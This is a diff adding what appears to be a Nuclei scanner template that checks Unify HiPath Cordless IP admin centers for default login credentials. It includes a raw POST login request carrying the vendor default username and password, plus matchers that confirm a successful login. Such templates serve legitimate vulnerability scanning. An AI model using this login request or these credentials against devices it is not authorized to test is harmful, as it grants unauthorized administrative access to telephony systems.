@@ -1,0 +1,62 @@
+id: unify-hipath-default-login
+
+info:
+  name: Unify HiPath Cordless IP - Default Login
+  author: FLX
+  severity: high
+  description: |
+    Default login credentials on the Unify HiPath Cordless IP admin center were discovered.
+  impact: |
+    An attacker could gain unauthorized access to the admin center and potentially change the configuration of the devices configured on the service.
+  remediation: |
+    Change the default password to a strong password.
+  reference:
+    - https://wiki.unify.com/images/d/dd/HiPath_Cordless_IP_V1,_Administrator_Documentation.pdf
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L
+    cvss-score: 8.3
+    cwe-id: CWE-522
+    cpe: cpe:2.3:a:unify:hipath:*:*:*:*:*:*:*:*:*
+  metadata:
+    verified: true
+    max-request: 2
+    product: hipath
+    vendor: unify
+  tags: default-login,unify,hipath
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "/html/wbm_login.html"
+
+  - raw:
+      - |
+        POST /cgi-bin/ikon_button.exe?page=1500&button=51&line=0&eventid=0&WbmSessionId=nosession&Username={{user}}&Password={{pass}}&CountryCode=en&NoSessionTimeout=false&SwitchLanguage=false HTTP/1.1
+        Host: {{Hostname}}
+
+    attack: pitchfork
+    payloads:
+      user:
+        - Unify
+      pass:
+        - 1q21q2
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: body
+        words:
+          - "{\"success\":true"
+          - "There is another user logged in"
+        condition: or
+# digest: 490a0046304402205ff5d386c2425291e7d17be713e4bf8c7ca99aa46ad5a6356ecbb7c48a92faa202207cd88795900bf9cb77a539555b727188c5670d2aa53c1d4cd1adc988aa64f56a:922c64590222798bb761d5b6d8e72950
